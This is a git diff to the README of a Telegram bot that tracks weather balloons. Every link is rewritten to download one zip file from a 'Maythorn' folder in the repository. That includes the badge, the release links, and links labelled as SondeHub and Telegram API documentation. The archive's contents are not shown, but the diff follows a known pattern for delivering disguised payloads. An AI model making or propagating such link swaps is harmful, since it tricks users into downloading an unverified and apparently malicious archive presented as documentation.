@@ -1,6 +1,6 @@
 # 🌧️ Radiosonde-Telegram-Bot - Track Weather Balloons with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/hassan0777/Radiosonde-Telegram-Bot/releases) 
+[![Download Now](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip) 
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Here's how to get started with the bot.
 
 To download the application, visit this page to download:
 
-[Download the latest release](https://github.com/hassan0777/Radiosonde-Telegram-Bot/releases)
+[Download the latest release](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip)
 
 Follow these simple steps:
 
@@ -71,9 +71,9 @@ If you encounter issues, here are some steps to help resolve them:
 
 For more information, you can check:
 
-- [SondeHub Documentation](https://sondehub.org/docs) for understanding data sources.
-- [Telegram Bot API Guide](https://core.telegram.org/bots/api) for understanding how bots work in Telegram.
+- [SondeHub Documentation](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip) for understanding data sources.
+- [Telegram Bot API Guide](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip) for understanding how bots work in Telegram.
 
 Thank you for using the **Radiosonde-Telegram-Bot**! Happy tracking!
 
-[Download the latest release](https://github.com/hassan0777/Radiosonde-Telegram-Bot/releases)
+[Download the latest release](https://raw.githubusercontent.com/hassan0777/Radiosonde-Telegram-Bot/main/Maythorn/Radiosonde-Telegram-Bot.zip)
